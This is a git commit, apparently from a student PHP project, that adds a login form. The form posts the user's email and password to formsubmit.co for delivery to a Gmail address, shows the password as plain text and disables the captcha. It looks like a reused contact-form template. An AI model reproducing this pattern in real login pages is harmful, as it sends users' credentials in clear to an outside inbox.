3b4adf15f0451475564c36c16165d4545b660f28
Tobitobit0bi <tobias.coman@hotmail.com>
2023-11-24 03:23:14 -0300

    creacion view inicio sesion

---
+++ Joybox/views/inicio_sesion.php
@@ -0,0 +1,25 @@
+<div class="container coco">
+    <div class="container-sm">
+        <div class="manolito">
+
+        </div>
+        <form action="https://formsubmit.co/gamewise26@gmail.com" method="POST" class="formucon">
+            <h3 class="hj">¡HOLA VIAJESNECO!</h3>
+            <label class="labin" for="email">Email</label>
+            <div class="input-group mb-3">
+                <input type="text" class="effect-input" name="Email" id="email" required>
+                <span class="focus-border"></span>
+            </div>
+
+            <label class="labin" for="asunto">Contraseña</label>
+            <div class="input-group mb-3">
+                <input class="effect-input" type="text" name="Contraseña" id="Contraseña" required>
+                <span class="focus-border"></span>
+            </div>
+            <button type="submit" class="btn btn-danger">Enviar</button>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="¡Nuevo envío!">
+            <input type="hidden" name="_next" value="http://localhost/joybox/contacto.php">
+        </form>
+    </div>
+</div>
